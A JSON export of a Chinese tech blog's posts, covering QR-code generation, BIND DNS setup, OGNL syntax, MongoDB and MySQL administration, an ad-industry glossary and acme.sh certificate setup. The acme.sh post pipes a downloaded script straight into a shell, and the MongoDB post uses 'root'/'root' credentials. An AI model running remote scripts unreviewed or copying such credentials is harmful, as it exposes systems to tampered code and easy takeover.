上面的使用可以说非常简单明了，QrCode-Plugin默认提供的文字集为千字文，字体为宋体，如果希望生成最上面的二维码（三个标准的探测图形，识别率更高）加一个选项.setDetectSpecial()即可 123456789101112131415161718192021/** * 文字二维码，顺序方式渲染 */@Testpublic void fontQr2() { String msg = \"http://weixin.qq.com/r/FS9waAPEg178rUcL93oH\"; try { boolean ans = QrCodeGenWrapper.of(msg) // 不输入文字时，默认采用千字文 // 默认文字顺序渲染 // true 则探测图形有自己的绘制规则 .setDetectSpecial() .setErrorCorrection(ErrorCorrectionLevel.H) .setDrawStyle(QrCodeOptions.DrawStyle.TXT) .setPicType(\"png\") .asFile(\"/tmp/fontQr2.png\"); } catch (Exception e) { e.printStackTrace(); }} 当然我们也可以用自定义的文字来生成二维码，并指定选择文字的方式为随机 123456789101112131415161718192021222324/** * 文字二维码 */@Testpublic void fontQr3() { String msg = \"http://weixin.qq.com/r/FS9waAPEg178rUcL93oH\"; try { boolean ans = QrCodeGenWrapper.of(msg) .setQrText(\"欢迎关注一灰灰\") // 指定文字随机渲染方式 .setQrTxtMode(QrCodeOptions.TxtMode.RANDOM) // true 则探测图形有自己的绘制规则 .setDetectSpecial() .setErrorCorrection(ErrorCorrectionLevel.H) .setDrawStyle(QrCodeOptions.DrawStyle.TXT) // 当相邻的NxN都是黑色小方块时，放大（慎用，因为部分汉子如 `一` 无法友好的填充2x2的方块） .setDrawEnableScale(true) .setPicType(\"png\") .asFile(\"/tmp/fontQr3.png\"); } catch (Exception e) { e.printStackTrace(); }} 4. 背景文字除了上面这种文字方式之外，还有一种如下图的这种，二维码显示一个字的情况 上面这个二维码，主要是借助背景图的渲染方式来实现，背景图上为一张浅灰底色，红字，二维码采用PENETRATE背景图穿透的模式，具体实现如下 12345678910111213141516171819202122@Testpublic void bgQrTxt() { try { String msg = \"http://weixin.qq.com/r/FS9waAPEg178rUcL93oH\"; BufferedImage bgImg = GraphicUtil.createImg(500, 500, null); Graphics2D g2d = GraphicUtil.getG2d(bgImg); g2d.setColor(Color.LIGHT_GRAY); g2d.fillRect(0, 0, 500, 500); Font font = new Font(\"宋体\", Font.BOLD, 500); g2d.setFont(font); g2d.setColor(Color.RED); g2d.drawString(\"码\", 0, 500 - g2d.getFontMetrics().getDescent() / 2); g2d.dispose(); boolean ans = QrCodeGenWrapper.of(msg).setBgImg(bgImg).setBgStyle(QrCodeOptions.BgImgStyle.PENETRATE).setBgW(500) .setBgH(500).setW(500).asFile(\"/tmp/bqrTxt.png\"); } catch (Exception e) { e.printStackTrace(); }} II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/06/29/200629-Quick-Media-中文二维码支持/"},{"title":"200703-grep 匹配到二进制文件","text":"直接使用grep 发现一个奇怪的问题，居然提示 12$ grep 'error' cic.log匹配到二进制文件 cic.log grep如果碰到\\000 NUL字符，就会认为文件是二进制文件。必须加上-a或–text选项强制让grep认为是文本文件才可以看到正常的结果 因此解决方案是: 123$ grep 'error' cic.log --text# 或者如下$ grep 'error' cic.log --a II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/07/03/200703-grep-匹配到二进制文件/"},{"title":"200624-Centos 内网DNS服务named配置手册","text":"本文记录基于bind服务搭建的内网dns解析过程 参考: Centos7Bind正反区域配置 1. 安装centos7 直接使用yum进行安装 1yum -y install bind 2. 配置named相关配置文件，在 /etc/named*下面 首先进入配置文件named.conf 12345678910options { // 改成any，侦听所有网卡 listen-on port 53 { any; }; // 不监听ipv6 // listen-on-v6 port 53 { ::1; }; ... // 注意，将这个里面的内容改成any, 允许所有人查询 allow-query { any; }; ...} 进入内网域名配置, named.rfc1912.zone，添加local内网域名 12345zone \"local\" IN { type master; file \"local.zone\"; allow-update { none; };}; 接下来需要编写 local.zone 文件 1234567891011121314vim /var/named/local.zone$TTL 1D@ IN SOA @ local. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum IN NS @ IN A 192.168.0.188test IN A 192.168.0.188wiki IN A 192.168.0.188 第一列为主机名 + 第二列为记录类型 + 第三列为映射地址 3. 启动使用 systemctl 启动服务 123456# 启动systemctl start named# 关闭systemctl stop named# 重启systemctl restart named 测试 1234567nslookup wiki.localServer: 192.168.0.188Address: 192.168.0.188#53Name: wiki.localAddress: 192.168.0.188 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/06/24/200624-Centos-内网DNS服务named配置手册/"},{"title":"200728-Centos hostname修改","text":"centos 6 修改方式 1234# 修改hostname，立即生效hostname new-hostname# 查看hostanmehostname centos 7 修改方式 1234# 修改hostname，立即生效hostnamectl set-hostname new-hostname# 查看hostnamehostname II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/07/28/200728-Centos-hostname修改/"},{"title":"200623-Python url编码","text":"Python提供了较好的url编码封装，常借助 parse来实现，一般常见的使用姿势有两种 123456789101112&gt;&gt;&gt; from urllib import parse# 直接对字符串进行url编码&gt;&gt;&gt; parse.quote('一灰灰Blog')'%E4%B8%80%E7%81%B0%E7%81%B0Blog'# 解码&gt;&gt;&gt; parse.unquote('%E4%B8%80%E7%81%B0%E7%81%B0Blog')'一灰灰Blog'# 对一个字典进行url编码，并组装成url参数&gt;&gt;&gt; p = {'a': '12+23', 'b': '一灰灰blog'}&gt;&gt;&gt; parse.urlencode(p)'a=12%2B23&amp;b=%E4%B8%80%E7%81%B0%E7%81%B0blog' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/06/23/200623-Python-url编码/"},{"title":"200902-python3 启动服务器","text":"python内置了一个非常简单的服务器，可以用来实现简单的http通信 如python3 启动服务器命令 12345# 默认端口号为8000python3 -m http.server# 指定端口号为9000python3.7 -m http.server 9000 如果是python2，需要启动服务器，可以使用命令 1python -m SimpleHTTPServer 9000 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/09/02/200902-python3-启动服务器/"},{"title":"201013-UnicodeDecodeError: 'gb2312' codec can't decode byte","text":"今天写个python爬虫时，发现一个有意思的问题，因为不同的目标网站的编码可能并不一样，所以再进行文本解析时，直接使用response.charset返回的编码格式进行处理文本，结果出现了上面这个问题，解决方法也比较简单，改用gbk即可 12345678910fp = open(file, 'r', encoding='gb2312')# 替换为fp = open(file, 'r', encoding='gbk')### http访问方式if response.charset == 'gb2312': code = 'gbk'else: code = response.charset raw = await response.text(encoding=code) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/10/13/201013-UnicodeDecodeError-gb2312-codec-can-t-decode-byte/"},{"title":"191129-Ognl 语法基础教程","text":"本文将力求用最简单的语言是和示例，介绍一下OGNL的语法规则，文章主要内容参考自官方文档http://commons.apache.org/proper/commons-ognl/language-guide.html 本篇主要是语法介绍篇，实战放在一下篇 1. 前言ognl，全称Object Graphic Navigation Language(对象图导航语言)，根据约定的一些简单的规则，组装一个利于阅读、可执行的表达式语句 如下面是一个典型的表达式 1\"name\".toCharArray()[0].numericValue.toString() 即便完全不懂ognl，单纯的以java的基础知识就可以看懂，而这就是ognl的魅力所在 （学习一点点东西，就可以马上入手） 2. 对象定位 说明，这一小节的内容为我个人为了方便理解而分类的，并不官方 我们知道在java中，一切都是对象，所以我们的ognl表达式必然是着手于某一个对象的，通常在ognl中，可以将待执行目标对象划分为三类 简单对象：(如基本数据类型，String) 非简单对象：(非简单对象，实例访问) 静态对象：(静态类) 在gonl的语法中，上面三种case，根据不同的开头来标记 静态对象 简单来说就是我想访问静态类的某个方法（或者静态类的成员） 1@java.lang.Math 语法规则为根据@开始，后面接上完整的类名 一个实例case如下，相当于java代码中直接调用Math.max(10, 20) 1@java.lang.Math@max(10, 20) 非简单对象 访问一个普通对象的成员or方法 1#demo 语法规则为根据#开头，后面为对象名（说明，这个对象需要在Ognl的上下文中，且可以根据对象名可以唯一定位） 简单对象 即基本类型的对象访问，不加任何前缀，直接使用即可，如下 12345678// 字符串的长度\"name\".length()// 数字计算1+2// booleantrue 3. 方法调用执行目标对象的某个方法，规则如下 12345678// 非基本对象的方法访问，#开头，对象与方法之间用.连接#obj.method( 参数 )// 静态对象的方法访问，@开头，对象与方法之间用@连接@xxx@method( 参数 )// 基本对象的方法访问，和非基本对象方法方式一致\"name\".length() 4. 成员访问访问目标对象的成员，规则如下 123456789// 非基本对象的成员访问，#开头，对象与成员之间用.连接#obj.field// 静态对象的成员访问，@开头，对象与成员之间用@连接@xxx@field// 基本对象的成员访问，和非基本对象成员方式一致\"name\".hash` 5. 集合ognl 针对常用的集合进行了特殊的支持 List 通过{}创建列表，通过[]来访问对象下标的元素 下面表示创建一个列表，有三个元素: 1,2,3; 获取列表中下标为2的元素 1{1, 2, 3}[2] Arrays 数组，可以结合new来使用 1new int[] {1,2,3} Map #{k:v, k:v} 方式来创建map 下面的语句，表示创建一个map，并获取其中key为name的元素 1#{ \"name\" : \"一灰灰Blog\", \"age\" : 18}[\"name\"] 6. 表达式语句前面是一些简单的，基本的成员访问，方法调用，除此之外还存在更牛逼的用法，支持表达式的执行 成员赋值 1#demo.name = \"一灰灰blog\" 表达式计算 1500 + 20 - 30 * 3 三目运算符 1\"name\".length() % 2 == 0 ? \"偶数长度\" : \"奇数长度\" 集合支持 针对集合做了一些简化，方便调用 1234567891011// in 语句，判断列表中是否包含\"name\" in {\"name\", \"hello\"}// 遍历集合，获取所有的偶数{1,2,3,4,5,6}.{? #this % 2 == 0}// 遍历集合，获取第一个满足条件的元素{1,2,3,4,5,6}.{^ #this % 2 == 0}// 遍历集合，获取最后一个满足条件的元素{1,2,3,4,5,6}.{$ #this % 2 == 0} 对象创建 可以直接通过new来创建一个对象，当我们需要执行的目标方法的参数为非基本类型时，可能会非常好用 12// new + 完整的类名new java.lang.String(\"hello world\") 链式语句 什么是链式语句呢？ 有点类似设计模式中的Builder模式，我要执行一串的操作，最后获取目标 定义规则如下，圆括号包裹起来，中间用逗号分隔，依次执行，最后一个为需要返回的目标 1(step1, step2,..., result) 结合上面的对象创建，可以实现非常强大的功能 12345package git.hui;class User { public String name; public Integer age;} 直接创建一个可用的User对象，下面执行完毕之后，直接获取一个属性被初始化后的User对象 1(#user=new git.hui.User(), #user.name=\"一灰灰Blog\", #user.age=18, #user) lambda表达式 这个有点高端了，首先是定义lambda表达式，然后借助前面的链式方式调用，下面是一个阶乘的case 1#fact = :[#this&lt;=1? 1 : #this*#fact(#this-1)], #fact(3) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/11/29/191129-Ognl-语法基础教程/"},{"title":"200319-MongoDb系列教程零：环境安装与初始化","text":"MongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。 MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。 本篇为mongodb系列教程第一篇，环境安装与连接设置 1. docker安装首先介绍最简单的安装方式，docker安装，请先保证docker环境存在（没有安装的推荐查看: Centos安装docker与使用说明） 安装命令如下: 1234567# 下载镜像docker pull mongo# 加载并运行镜像docker run --name mongo -p 27017:27017 -d mongo --auth# 进入容器docker exec -it mongo /bin/bash 2. centos安装直接借助yum进行安装，命令如下 1234# 查看支持的mongo库yum list | grep mongoyum install -y mongodb.x86_64 mongodb-server.x86_64 3. 用户配置直接通过mongodb提供的终端命令进行设置， 123456# 为mongo创建登录用户和密码mongouse admindb.createUser({user:\"root\",pwd:\"root\",roles:[{role:'root',db:'admin'}]})exit 4. 终端控制台mongodb集成了终端控制台，通过mongo进入； 但是当我们设置了登录认证时，有下面两种使用姿势 case1 12# 直接指定用户名密码，注意--authenticationDatabase admin 必须得有mongo -u root -p root --authenticationDatabase admin case2 12345mongo# 下一行不可少use admindb.auth('root', 'root') 5. 可视化操作工具终端虽好，使用起来终究不太顺手，可视化工具推荐使用ROBO 3T操作mongodb，官网下载地址: https://robomongo.org/ 然后配置mongodb连接信息（支持ssh验证方式哦），下面是一个简单的配置 然后就可以通过它来操作mongodb了 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/03/19/200319-MongoDb系列教程零-环境安装与初始化/"},{"title":"200918-GitHub新特性-个人主页","text":"这两天逛github时，发现一个有意思的地方，在看到某些大佬的主页时，发现多了一个如下类似自我介绍的版块，因此我也迅速的学习了一下 1. 实现方式要实现上面这个版块比较简单，新增一个仓库，与自己的用户名相同即可，如下操作 需要注意的是确保 仓库是public 有一个 readme.md 文件 接下来就是在readme.md文件中编写你想添加的东西即可，比如上面截图中的个人项目统计，常用语言等卡片，主要利用github-readme-stats来支持的，具体的使用方法比较简单，有中文说明文档 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/09/18/200918-GitHub新特性-个人主页/"},{"title":"201014-Js base64编解码","text":"Js使用base64编解码主要借助btoa与atob两个方法，但使用时需要注意，它们并不支持非ascii码转码 12345&gt; b = btoa(\"hello world\")&lt; \"aGVsbG8gd29ybGQ=\"&gt; atob(b)&lt;\"hello world\" 如果我们希望对一个中文进行编码，会出现如下错误 1btoa(\"一灰灰blog\") 直接执行，会提示错误VM265:1 Uncaught DOMException: Failed to execute 'btoa' on 'Window': The string to be encoded contains characters outside of the Latin1 range 一个简单的解决办法就是先编码一下，如urlencode 12345&gt; a = btoa(encodeURIComponent(\"一灰灰blog\"))&lt; \"JUU0JUI4JTgwJUU3JTgxJUIwJUU3JTgxJUIwYmxvZw==\"&gt; b = decodeURIComponent(atob(a))&lt; \"一灰灰blog\" II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/10/14/201014-Js-base64编解码/"},{"title":"200929-Python 批量修改文件名","text":"遇到一个实际的场景，需要针对某个目录下的所有文件进行统一规则的重命名，使用shell脚本是一个比较好的选择，此外python也可以快速的实现 下面介绍一下核心代码 123456789import osfor p, n, filename in os.walk('./'): # 获取目录下所有的文件 i = 0 for file in filename: # 遍历文件名，依次重命名 os.rename(file, 'out_%02d' % (i)) i + =1 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/09/29/200929-Python-批量修改文件名/"},{"title":"200910-MySql最大连接数查看与修改","text":"原文来自: https://www.cnblogs.com/niuben/p/10834668.html 查看与修改mysql的最大连接数命令如下 12345-- 查看最大连接数show variables like '%max_connections%';-- 修改最大连接数set GLOBAL max_connections = 1024; 从上面的查看最大连接数的sql语句也可以看到这个属于配置变量，我们可以通过sohw status查看一些常见的信息 参数 说明 Aborted_clients 由于客户没有正确关闭连接已经死掉，已经放弃的连接数量。 Aborted_connects 尝试已经失败的MySQL服务器的连接的次数。 Connections 试图连接MySQL服务器的次数。 Created_tmp_tables 当执行语句时，已经被创造了的隐含临时表的数量。 Delayed_insert_threads 正在使用的延迟插入处理器线程的数量。 Delayed_writes 用INSERTDELAYED写入的行数。 Delayed_errors 用INSERTDELAYED写入的发生某些错误(可能重复键值)的行数。 Flush_commands 执行FLUSH命令的次数。 Handler_delete 请求从一张表中删除行的次数。 Handler_read_first 请求读入表中第一行的次数。 Handler_read_key 请求数字基于键读行。 Handler_read_next 请求读入基于一个键的一行的次数。 Handler_read_rnd 请求读入基于一个固定位置的一行的次数。 Handler_update 请求更新表中一行的次数。 Handler_write 请求向表中插入一行的次数。 Key_blocks_used 用于关键字缓存的块的数量。 Key_read_requests 请求从缓存读入一个键值的次数。 Key_reads 从磁盘物理读入一个键值的次数。 Key_write_requests 请求将一个关键字块写入缓存次数。 Key_writes 将一个键值块物理写入磁盘的次数。 Max_used_connections 同时使用的连接的最大数目。 Not_flushed_key_blocks 在键缓存中已经改变但是还没被清空到磁盘上的键块。 Not_flushed_delayed_rows 在INSERTDELAY队列中等待写入的行的数量。 Open_tables 打开表的数量。 Open_files 打开文件的数量。 Open_streams 打开流的数量(主要用于日志记载） Opened_tables 已经打开的表的数量。 Questions 发往服务器的查询的数量。 Slow_queries 要花超过long_query_time时间的查询数量。 Threads_connected 当前打开的连接的数量。 Threads_running 不在睡眠的线程数量。 Uptime 服务器工作了多少秒 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/09/10/200910-MySql最大连接数查看与修改/"},{"title":"201108-Mac Chrome浏览器插件默认位置","text":"mac chrome插件默认存储位置为 1~/Library/Application Support/Google/Chrome/Default/Extensions 借助开发模式，可以导出一些好用的插件分享给其他小伙伴 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/11/08/201108-Mac-Chrome浏览器插件默认位置/"},{"title":"201121-Mac android studio 4.1 missing essential plugin问题解决","text":"android studio 4.1 禁用一个插件之后重启，结果发现应用都起不来了，直接报了一个错误 这就有点尴尬了，禁用一个插件直接导致不可用，那么能想到的解决办法就是将这个插件启用，问题是应用都跪了，怎么启用插件呢？ 1. 问题修复全过程由于我的环境是mac，所以下面介绍一下mac下如何定位相关的配置文件 接下来进入macos，点击studio，启动app 在终端中可以看到一些输出信息，找到配置文件目录/Users/user/Library/Application Support/Google/AndroidStudio4.1 接下来找到 disabled_plugins.txt，找到需要恢复的插件，把那一行干掉即可 2. 小结出现这个问题不得不让人吐槽，必要的插件，禁用的时候好歹也得给个提示吧，直接不让用就有点过分了，至少给一个入口重新启用也可以吧… 其次就是网上也有不少解决这个问题的博文，一般都是直接说在某个路径下，可以找到disabled_plugins.txt文件，然而不同的版本它们存放的位置可能并不一样，所谓是授人以鱼不如授人以渔，本文附带了寻找配置文件路径的方法 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/11/21/201121-Mac-android-studio-4-1-missing-essential-plugin问题解决/"},{"title":"201118-广告运营专业词汇(转载)","text":"主要记录广告运营推广的一些专业词汇，用于记录，原文请点击: 广告运营推广专业词汇ROI,CPC,CPM,CTR,CPI,CPS,DAU,ARPU,ECPM等等 1. 推广/广告指标 简称 说明 CPM cost per mille 千次展示成本，CPM = 广告费用/展示次数x1000 Impressions 展示量/曝光 CPA Cost per action按照行动付费，可以是点击，安装，购买等 CPC Cost per clicks按点击付费 CPI Cost per install,按照安装付费 CPS Cost per sales:按照给商家带来的销售额付费 CPL Cost per lead 按照销售线索付费 CPT Cost Per Time 按时长结算。广告主为其广告在媒体某一固定展示位展示的时长付费。 CTR Click-Through-Rate点击率，CTR = 点击量/展示量 ECPM 对于广告负责人来说最重要的概念! ROI Return Of Investmen，投入产出比 ROAS Return on Advertise Spend，广告支出总回报率, 这个和ROI稍有不同 Engagement Rate 互动率/参与度，比如一个帖子或者广告有多少人评论，转发等 DAU Daily Active User 日活跃用户数量 MAU Monthly Active User 月活跃用户数量 ARPU (Average Revenue Per User)每用户平均收入，多用于衡量App或者游戏，用于衡量公司产品收入能力的指标 Bounce Rate 跳出率 Referral 引荐 Retention 留存 UV Unique Visitor，独立访客。 PV Page View，网页被浏览的总次数 2. 广告基础名词 简称 说明 DSP Demand-side platform 需求方平台 SSP Supply-side platform 供应方平台 RTB（Real-time Bidding） 实时竞价广告 SEM Search Engine Marketing ，搜素引擎广告 比如google ads，Yahoo ads ，bing ads GDN Google display netowrk，google展示广告联盟 Google Adsense google adsense，谷歌联盟广告 Pixel 像素代码，用于跟踪广告效果，比如facebook Display Ads 展示广告，展示广告主要指静态的图片广告、动画广告，以及富媒体广告 DMP Date management platment 数据管理平台 Native Ads 原生广告，通俗说是那些看起来就像网站或者 app 中的正常内容一样的广告 Conversion 转化 Optimize 优化 CRO 转化率优化 CTA Call to action行动号召 PPC Pay Per Click，特指搜索引擎的付费竞价排名广告推广形式 CBO camgain buget optimization, Facebook自动分配预算优化的一个功能 Bid 出价/竞价 Reach 人群触达 Coverage 人群覆盖 Campaign 广告系列 Ad Set/Group 广告组 Ads 广告素材、广告创意、广告 Audience 受众 DPA (Dynamic Product Ads) 根据用户在网站的行为/兴趣,自动向他们推广相关产品广告 Remarketing Ad 再营销广告，跟DPA有点类似，也是根据用户的行为匹配广告，比如某宝的狗皮膏药——你只要看过某类产品，你去到别的很多网站的广告位都看到相关产品的广告 DSA(Dynamic Search ads） 动态搜索广告 Lookalike/Similar Audiences 相似受众 ASO App Store Optimization 泛指APP排名榜优化 AEO (App Events Optimization) 广告投放优化用的App事件优化，比如安装，通关，内购 Deep Link 给按钮、着陆页添加一窜代码的唯一链接，用于监控广告效果 A/B Testing 一般把人群分为两组变量（比如广告语，或者图片，视频），用于测试那组广告效果好 GA Google用于网站分析工具 LTV Life Time Value 用户生命周期 Opt-in 订阅 Subscription 订阅 BIO 社交媒体上的个人描述 Hashtag 通常是社交平台的#标签 Tradingdesk 网上的解释特别玄乎，说白了，就是一管理多个广告投放的平台集合，比如管理搜索广告，信息流广告，网盟的整合平台，方便操作提高效率。 3. 电商 简称 说明 Add to cart (ATC) 加入购物车 GMV Gross Merchandise Volum 总成交额，或者订单总额 SKU Stock KeepingUnit ，泛指品类 Give Away 赠品活动 Flat fee 固定合作费用 Quote 报价，费用 IO Insertion Order 订单 BFCM( black friday and cyber monday) 黑五网一 COD Cash on delivery 货到付款 POD Print On Demand or publish on demand 定制服务 CRM 客户关系管理 Shopping Cart Abandonment 加入购物车没结账 EDM E-mail Direct Marketing邮件营销 4. 网红 简称 说明 Influencer Marketing 红人营销，老外一般用这个，不像国内都说KOL KOL Key Opinion Leader 关键意见领袖,国内俗称网红的叫法 MCN Multi-Channel Network,泛指网红代理商或者经纪 Viral Marketing 病毒营销 IP 原意是Intellectual Property 知识产权，隐身为网红，比如说打造个人IP就是说把自己塑造成网红或者意见领袖 UGC User Generated Content，通过用户产生内容 PGC Professional Generated Content，和用户产生内容相对，泛指由官方或者公司产生内容 Shoutout Instagram上面网红F发布内容@商家的动作 Tryon Haul Youtube上面跟网红合作的试穿测评类型 Unboxing 开箱测评 Live Stream 直播 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/11/18/201118-广告运营专业词汇-转载/"},{"title":"201010-Android A WebView method was called on thread JavaBridge","text":"Android开发过程中，偶遇一个webview与android通信的问题，提示A WebView method was called on thread 'JavaBridge'. All webview methods must be called... 这个问题发现Android 9以上会出现，解决方法是@JavascriptInterface注解的方法必须指定在UI线程执行，将原来方法里的代码放入run里面执行即可 如下 123456// 注意这个activity就是webview所在的activityH5DetailActivity.this.runOnUiThread(new Runnable() { public void run() { webView.loadUrl(\"javascript:initBookList('\" + ans + \"')\"); }}); II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2020/10/10/201010-Android-A-WebView-method-was-called-on-thread-JavaBridge/"},{"title":"200810-acme.sh 快速实现https证书颁发与自动续期","text":"借助acem.sh来迅速实现let’s encrypt的泛域名ssl证书颁发与续期，基本上五分钟就可以解决战斗 本文主要内容来自acme.sh的官方wiki，一切以官方说明为准: acme wiki I. 安装步骤1. 登录服务器登录到某台linux服务器，我这里以Centos举例说明 1234ssh xxx@xxx# 切换root账号su 2. 安装acme.sh123yum install socat -ycurl https://get.acme.sh | shcd ~/.acme.sh/ 3. 申请密钥到域名购买服务商，申请api key，用于后期的txt记录验证 DNSPod 密钥申请完毕之后，如下操作导入命令 123# DNSPodexport DP_Id=\"id\"export DP_Key=\"key\" 阿里云 ALY_KEY 和 ALY_TOKEN：阿里云 API key 和 Secrec 官方申请文档。 申请完毕之后，如下操作 12export Ali_Key=\"key\"export Ali_Secret=\"secret\" godaddy GODADDY_KEY 和 GODADDY_TOKEN：GoDaddy API 密钥官方申请文档 12export GD_Key=\"key\"export GD_Secret=\"secret\" 其他 至于其他平台，应该如何导入API key，可以参考下面的文档，这里不一一说明了 https://github.com/acmesh-official/acme.sh/wiki/dnsapi 4. 证书生成123456# 请注意，--dns后面的参数，一般来讲后缀就是上面的导入key的前缀# 如果不确定，到上面的github连接中去找# 针对 hhui.top 域名生成通配的证书# 在我的测试中，如果只指定 -d *.hhui.top ，那么生成的证书没有包含 hhui.top 这个主域名，所以当我希望这个证书都能包含时，第一个填写主域名./acme.sh --issue --dns dns_ali -d 'hhui.top' -d '*.hhui.top' 证书生成之后，会在.acme.sh目录下，新生成一个 *.hhui.top(就是我们上面指定的通配域名) 文件夹，证书在里面 5. 